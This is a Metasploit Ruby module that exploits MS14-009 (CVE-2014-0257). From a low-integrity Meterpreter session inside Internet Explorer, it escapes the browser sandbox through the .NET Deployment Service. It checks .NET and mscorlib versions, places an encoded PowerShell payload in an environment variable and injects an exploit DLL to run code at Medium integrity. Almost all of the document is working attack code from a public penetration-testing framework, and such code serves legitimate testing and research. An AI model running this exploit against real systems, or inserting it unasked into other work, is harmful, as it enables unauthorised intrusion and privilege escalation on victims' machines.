##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::FileInfo
  include Msf::Post::File

  NET_VERSIONS = {
    '4.5' => {
      'dfsvc' => '4.0.30319.17929.17',
      'mscorlib' => '4.0.30319.18063.18'
    },
    '4.5.1' => {
      'dfsvc' => '4.0.30319.18408.18',
      'mscorlib' => '4.0.30319.18444.18'
    }
  }

  def initialize(info={})
    super( update_info( info,
      'Name'		=> 'MS14-009 .NET Deployment Service IE Sandbox Escape',
      'Description'	=> %q{
        This module abuses a process creation policy in the Internet Explorer Sandbox which allows
        to escape the Enhanced Protected Mode and execute code with Medium Integrity. The problem
        exists in the .NET Deployment Service (dfsvc.exe), which can be run as Medium Integrity
        Level. Further interaction with the component allows to escape the Enhanced Protected Mode
        and execute arbitrary code with Medium Integrity.
      },
      'License'	=> MSF_LICENSE,
      'Author'	=>
        [
          'James Forshaw', # Vulnerability Discovery and original exploit code
          'juan vazquez' # metasploit module
        ],
      'Platform'	    => [ 'win' ],
      'SessionTypes'	=> [ 'meterpreter' ],
      'Targets'	=>
        [
          [ 'IE 8 - 11', { } ]
        ],
      'DefaultTarget' => 0,
      'DefaultOptions'  =>
        {
          'WfsDelay' => 30
        },
      'DisclosureDate'=> "Feb 11 2014",
      'References' =>
        [
          ['CVE', '2014-0257'],
          ['MSB', 'MS14-009'],
          ['BID', '65417'],
          ['URL', 'https://github.com/tyranid/IE11SandboxEscapes']
        ]
    ))
  end

  def check
    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe")
      return Exploit::CheckCode::Unknown
    end

    net_version = get_net_version

    if net_version.empty?
      return Exploit::CheckCode::Unknown
    end

    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.dll")
      return Exploit::CheckCode::Detected
    end

    mscorlib_version = get_mscorlib_version

    if Gem::Version.new(mscorlib_version) >= Gem::Version.new(NET_VERSIONS[net_version]["mscorlib"])
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Vulnerable
  end

  def get_net_version
    net_version = ""

    dfsvc_version = file_version("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe")
    dfsvc_version = dfsvc_version.join(".")

    NET_VERSIONS.each do |k,v|
      if v["dfsvc"] == dfsvc_version
        net_version = k
      end
    end

    net_version
  end

  def get_mscorlib_version
    mscorlib_version = file_version("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.dll")
    mscorlib_version.join(".")
  end

  def exploit
    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?

    mod_handle = session.railgun.kernel32.GetModuleHandleA('iexplore.exe')
    if mod_handle['return'] == 0
      fail_with(Failure::NotVulnerable, "Not running inside an Internet Explorer process")
    end

    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NotVulnerable, "Not running at Low Integrity")
    end

    print_status("Searching .NET Deployment Service (dfsvc.exe)...")

    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\dfsvc.exe")
      fail_with(Failure::NotVulnerable, ".NET Deployment Service (dfsvc.exe) not found")
    end

    net_version = get_net_version

    if net_version.empty?
      fail_with(Failure::NotVulnerable, "This module only targets .NET Deployment Service from .NET 4.5 and .NET 4.5.1")
    end

    print_good(".NET Deployment Service from .NET #{net_version} found.")

    print_status("Checking if .NET is patched...")

    unless file_exist?("#{get_env("windir")}\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.dll")
      fail_with(Failure::NotVulnerable, ".NET Installation can not be verified (mscorlib.dll not found)")
    end

    mscorlib_version = get_mscorlib_version

    if Gem::Version.new(mscorlib_version) >= Gem::Version.new(NET_VERSIONS[net_version]["mscorlib"])
      fail_with(Failure::NotVulnerable, ".NET Installation not vulnerable")
    end

    print_good(".NET looks vulnerable, exploiting...")

    cmd = cmd_psh_payload(payload.encoded).gsub('%COMSPEC% /B /C start powershell.exe ','').strip
    session.railgun.kernel32.SetEnvironmentVariableA("PSHCMD", cmd)

    temp = get_env('TEMP')

    print_status("Loading Exploit Library...")

    session.core.load_library(
        'LibraryFilePath' => ::File.join(Msf::Config.data_directory, "exploits", "CVE-2014-0257", "CVE-2014-0257.dll"),
        'TargetFilePath'  => temp +  "\\CVE-2014-0257.dll",
        'UploadLibrary'   => true,
        'Extension'       => false,
        'SaveToDisk'      => false
    )
  end

  def cleanup
    session.railgun.kernel32.SetEnvironmentVariableA("PSHCMD", nil)
    super
  end

end
